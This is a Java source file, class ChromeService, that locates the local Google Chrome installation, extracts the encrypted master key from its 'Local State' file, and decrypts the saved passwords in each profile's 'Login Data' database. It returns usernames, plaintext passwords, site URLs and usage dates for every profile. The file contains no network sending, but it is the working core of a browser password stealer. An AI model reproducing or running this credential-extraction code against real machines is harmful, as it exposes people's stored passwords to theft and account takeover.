package random.chrome;

import org.json.JSONObject;
import random.util.OperatingSystem;

import java.io.File;
import java.io.IOException;
import java.lang.invoke.MethodHandles;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.sql.Connection;
import java.sql.ResultSet;
import java.util.ArrayList;
import java.util.Collections;
import java.util.List;
import java.util.Map;
import java.util.logging.Level;
import java.util.logging.Logger;
import java.util.stream.Collectors;

public class ChromeService {
    private static final Logger LOG = Logger.getLogger(MethodHandles.lookup().lookupClass().getName());

    private final SqliteDB sqliteDB;

    public ChromeService() {
        sqliteDB = new SqliteDB();
    }

    public Map<String, List<ChromeAccountEntry>> getProfiles() throws Exception {
        Path chromeInstallPath = getChromeInstallPath();

        File chromeInfo = getLocalStateFile(getChromeInstallPath());
        final String[] infoLines = Files.readAllLines(Paths.get(chromeInfo.toURI())).toArray(new String[]{});

        String jsonProfileString = switch (OperatingSystem.getOperatingSystem()) {
            case WINDOWS -> infoLines[0];
            case MAC -> infoLines[0].split("\\{|\\}")[0];
            default -> throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
        };

        JSONObject rootJson = new JSONObject(jsonProfileString);
        JSONObject infoCache = rootJson
                .getJSONObject("profile")
                .getJSONObject("info_cache");

        String encryptedMasterKeyWithPrefixB64 = rootJson.getJSONObject("os_crypt").getString("encrypted_key");
        byte[] masterKey = ChromeSecurity.getMasterKey(encryptedMasterKeyWithPrefixB64);

        return infoCache.keySet().stream()
                .map(profileName -> {
                    JSONObject userProfile = infoCache.getJSONObject(profileName);
                    String name = userProfile.getString("user_name");
                    String gaiaName = userProfile.getString("gaia_name");
                    return new ChromeProfile(name, gaiaName, profileName);
                }).collect(Collectors.toMap(ChromeProfile::name, profile -> {
                    File loginDataFile = getLoginDataFile(chromeInstallPath, profile.profileName());
                    return getChromeAccountsFromDatabaseFile(loginDataFile, masterKey);
                }));
    }

    private List<ChromeAccountEntry> getChromeAccountsFromDatabaseFile(File dbFile, byte[] masterKey) {
        try (Connection connection = sqliteDB.connectToTempDB(dbFile, "CHROME_LOGIN_");
             ResultSet resultSet = connection.createStatement().executeQuery(ChromeAccountEntry.LOGIN_QUERY)) {
            if (connection.isClosed()) {
                throw new IOException("Connection to database has been terminated! Cannot fetch accounts.");
            }
            List<ChromeAccountEntry> accounts = new ArrayList<>();
            while (resultSet.next()) {
                try {
                    String usernameElement = resultSet.getString("username_element");
                    String usernameValue = resultSet.getString("username_value");
                    String displayName = resultSet.getString("display_name");
                    String password = ChromeSecurity.decryptChromeSecret(resultSet.getBytes("password_value"), masterKey);
                    String actionUrl = resultSet.getString("action_url");
                    String originUrl = resultSet.getString("origin_url");
                    String dateCreated = resultSet.getString("date_created");
                    String dateLastUse = resultSet.getString("date_last_used");
                    String datePasswordModified = resultSet.getString("date_password_modified");
                    Integer timesUsed = resultSet.getInt("times_used");
                    ChromeAccountEntry chromeAccount = new ChromeAccountEntry(usernameValue, usernameElement, displayName,
                            password, actionUrl, originUrl,
                            dateCreated, dateLastUse, datePasswordModified, timesUsed);

                    accounts.add(chromeAccount);
                } catch (Exception e) {
                    LOG.log(Level.SEVERE, e.getMessage(), e);
                }
            }
            return accounts;
        } catch (Exception e) {
            LOG.log(Level.SEVERE, e.getMessage(), e);
            return Collections.emptyList();
        }
    }

    private Path getChromeInstallPath() throws Exception {
        final OperatingSystem os = OperatingSystem.getOperatingSystem();
        if (os == OperatingSystem.UNKNOWN) {
            throw new Exception(System.getProperty("os.name") + " is not supported by this application!");
        }
        Path chromeInstall = Paths.get(os.getChromePath());
        if (Files.notExists(chromeInstall)) {
            throw new IOException("Google chrome installation not found.");
        }
        return chromeInstall;
    }

    private File getLoginDataFile(Path chromeInstallPath, String profileName) {
        return new File(chromeInstallPath + File.separator + profileName, "Login Data");
    }

    private File getLocalStateFile(Path chromeInstallPath) throws Exception {
        return new File(chromeInstallPath.toString(), "Local State");
    }
}
